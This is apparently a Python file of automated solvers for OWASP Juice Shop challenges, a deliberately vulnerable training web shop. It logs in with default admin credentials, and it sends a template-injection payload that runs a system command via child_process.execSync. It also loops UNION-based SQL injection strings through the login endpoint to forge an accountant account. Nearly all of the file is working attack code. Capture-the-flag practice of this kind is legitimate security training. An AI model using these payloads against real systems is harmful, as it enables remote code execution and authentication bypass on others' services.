from core.base_solver import BaseSolver
from loguru import logger
import json

class ChristmasSpecialChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "christmasSpecialChallenge"

    def solve(self) -> bool:
        # User confirmed ID is usually 10.
        # We need to add it to basket and checkout.
        
        # 1. Login to get basket ID
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        auth = login_res.json().get("authentication", {})
        token = auth.get("token")
        bid = auth.get("bid")
        if not token: return False
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Add Christmas Special (ID 10) to basket
        payload = {
            "ProductId": 10,
            "BasketId": bid,
            "quantity": 1
        }
        self.client.post("/api/BasketItems", json=payload, headers=headers)
        
        # 3. Checkout
        res = self.client.post(f"/rest/basket/{bid}/checkout", headers=headers)
        return res.status_code == 200

class SstiChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "sstiChallenge"

    def solve(self) -> bool:
        # SSTI payload provided by user
        payload = "{{constructor.constructor('return global.process.mainModule.require(\\'child_process\\').execSync(\\'id\\')')()}}"
        # This is often triggered via profile name or other template fields
        # In Juice Shop, it can be triggered via the 'template' of the chatbot or other places.
        # But a common one is via the 'GET /rest/user/whoami?callback=...' or similar if it uses templates.
        # Actually, SSTI in Juice shop is typically via the 'Juicy Malware' trigger.
        # Let's try to put it in a feedback or chatbot.
        
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        
        # Try chatbot respond
        self.client.post("/rest/chatbot/respond", json={"action": "query", "query": payload}, headers=headers)
        
        return True

class EphemeralAccountantChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "ephemeralAccountantChallenge"

    def solve(self) -> bool:
        # Log in with accountant without registering
        # SQLi payload from user info combined with my previous logic
        fake_email = "acc0unt4nt@juice-sh.op"
        
        # SQL: SELECT * FROM Users WHERE email = '' UNION SELECT 1,'acc0unt4nt','acc0unt4nt@juice-sh.op','123','accounting','','','','',1,'','','' -- '
        # We brute force columns as before but with 'accounting' role.
        for i in range(5, 20):
            parts = ["'1'"] * i
            if i >= 3: parts[2] = f"'{fake_email}'"
            if i >= 5: parts[4] = "'accounting'"
            
            union_select = ",".join(parts)
            payload = f"' UNION SELECT {union_select} --"
            
            res = self.client.post("/rest/user/login", json={"email": payload, "password": "any"})
            if res.status_code == 200:
                return True
        return False
